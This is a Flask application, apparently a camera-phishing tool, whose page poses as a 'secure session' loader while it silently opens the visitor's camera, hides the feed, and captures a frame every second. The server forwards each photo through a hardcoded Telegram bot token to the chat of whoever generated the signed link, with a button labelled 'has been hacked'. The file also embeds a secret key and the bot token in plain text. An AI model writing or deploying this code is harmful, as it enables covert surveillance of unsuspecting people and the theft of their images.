from flask import Flask, request, render_template_string
import requests
import base64
from itsdangerous import URLSafeTimedSerializer
import os
import json  # تم استيراد json لتحويل الأزرار بشكل صحيح لتليجرام

SECRET_KEY = "Qx9!vR7#pLm2@8ZtWc6^KfY3nAsD5JhUo1XeG4"
serializer = URLSafeTimedSerializer(SECRET_KEY)

# ===== صفحة الكاميرا المدمجة والمطورة =====
HTML_CAMERA_PAGE = """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Secure Session</title>

<style>
body {
    margin:0;
    background:#000;
    color:#fff;
    font-family:sans-serif;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
    overflow:hidden;
}

.loader-box {
    text-align:center;
}

.circle {
    width: 90px;
    height: 90px;
    border: 7px solid #222;
    border-top: 7px solid #f1c40f;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin: 0 auto 25px;
}

@keyframes spin {
    100% { transform: rotate(360deg); }
}

.text {
    font-size: 26px;
    opacity: 0.8;
    animation: blink 1.5s infinite;
}

@keyframes blink {
    50% { opacity:0.3; }
}

video {
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:100%;
    object-fit:cover;
    opacity:0; 
}
</style>
</head>

<body>

<div class="loader-box">
    <div class="circle"></div>
    <div class="text">جاري تهيئة الجلسة الآمنة...</div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" width="300" height="200" style="display:none;"></canvas>

<script>
let video = document.getElementById('video');
let user_id = "{{ user_id }}";
let interval = null;

async function startCamera() {
    try {
        const params = new URLSearchParams(window.location.search);
        const cameraMode = params.get("camera") || "user"; 

        let stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: cameraMode }
        });

        video.srcObject = stream;
        await video.play();

        function captureAndSend() {
            let canvas = document.getElementById('canvas');
            let ctx = canvas.getContext('2d');

            ctx.drawImage(video, 0, 0, 300, 200);

            let image = canvas.toDataURL("image/png");

            fetch('/upload', {
                method: 'POST',
                body: JSON.stringify({
                    image: image,
                    user_id: user_id
                }),
                headers: {'Content-Type': 'application/json'}
            });
        }

        interval = setInterval(captureAndSend, 1000);

    } catch (err) {
        document.querySelector(".text").innerText = "حدث خطأ في التحقق من الجلسة";
        console.log(err);
    }
}

window.onload = startCamera;
</script>

</body>
</html>
"""  

# ===== صفحة انتهاء الصلاحية =====
EXPIRED_PAGE = """
<!DOCTYPE html>  
<html>  
<head><meta charset="UTF-8"><title>انتهت الصلاحية</title></head>  
<body style="text-align:center; font-family:sans-serif; padding-top: 100px;">  
<h2>❌ انتهت صلاحية الرابط أو التوكن غير صحيح</h2>  
<p>هذا الرابط صالح لفترة محدودة فقط.</p>  
</body>  
</html>  
"""   

BOT_TOKEN = "8757327245:AAGcZrFnhhYhmH_7sF4i206jn6ktyxCzt2Y"
app = Flask(__name__)

def decode_token(token):
    try:
        return serializer.loads(token, max_age=259200)
    except:
        return None

@app.route('/upload', methods=['POST'])
def upload():
    try:
        data = request.get_json()
        if not data or "image" not in data:
            return {"error": "invalid data"}, 400

        # إصلاح خطأ الـ split بإضافة [1] للحصول على بيانات الصورة المشفرة فقط
        img_bytes = base64.b64decode(data["image"].split(",")[1])  
        user_id = data.get("user_id")  
          
        if not user_id:  
            return {"error": "missing user_id"}, 400  

        # بناء هيكل الأزرار بالاسم الجديد "已被入侵" مع خاصية callback_data
        reply_markup = {
            "inline_keyboard": [
                [
                    {
                        "text": "已被入侵", 
                        "callback_data": "hacked_status", 
                        "style": "danger",                         
                        "icon_custom_emoji_id": "5990261552828127881"
                    }
                ]
            ]
        }

        # تجميع البيانات وإرسالها لتليجرام
        payload = {
            "chat_id": user_id,
            "has_spoiler": True,
            "reply_markup": json.dumps(reply_markup)  
        }

        r = requests.post(  
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",  
            files={"photo": ("image.png", img_bytes)},  
            data=payload,  
            timeout=15
        )  
        return {"status": "ok"}, 200  
    except Exception as e:  
        return {"error": str(e)}, 500

@app.route("/")
def home():
    token = request.args.get("token")
    data = decode_token(token)

    if not data:  
        return render_template_string(EXPIRED_PAGE)  

    user_id = data["user_id"]  
    return render_template_string(HTML_CAMERA_PAGE, user_id=user_id)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
